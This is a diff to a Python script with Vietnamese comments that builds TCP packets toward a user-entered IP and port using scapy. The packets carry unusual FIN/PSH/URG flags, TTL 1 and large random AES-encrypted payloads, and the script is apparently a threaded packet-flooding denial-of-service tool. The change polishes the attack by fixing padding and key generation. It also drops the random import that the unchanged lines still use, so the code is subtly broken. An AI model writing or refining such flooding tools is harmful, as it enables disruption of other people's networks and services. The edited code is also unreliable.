@@ -1,9 +1,9 @@
-###
-import random
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import os
 import threading
 import time
 from scapy.all import *
-from Crypto.Cipher import AES
 
 # Nhập các giá trị từ người dùng
 target_ip = input("IP: ")
@@ -17,9 +17,9 @@ payloads = [bytes([random.randint(0, 255) for _ in range(65534)]) for _ in range
 # Hàm để gửi packet
 def send_packet(payload):
     # Mã hóa tải trọng bằng AES
-    key = b''.join([bytes([random.randint(0, 255)]) for _ in range(16)])
+    key = os.urandom(16)
     cipher = AES.new(key, AES.MODE_ECB)
-    encrypted_payload = cipher.encrypt(payload)
+    encrypted_payload = cipher.encrypt(pad(payload, AES.block_size))
     
     # Tạo TCP packet với tải trọng đã mã hóa
     packet = IP(dst=target_ip, ttl=1) / TCP(dport=target_port, flags="FPU", options=[("MSS", 1460), ("NOP", None), ("WScale", 10), ("SAckOK", b"")]) / Raw(load=encrypted_payload)
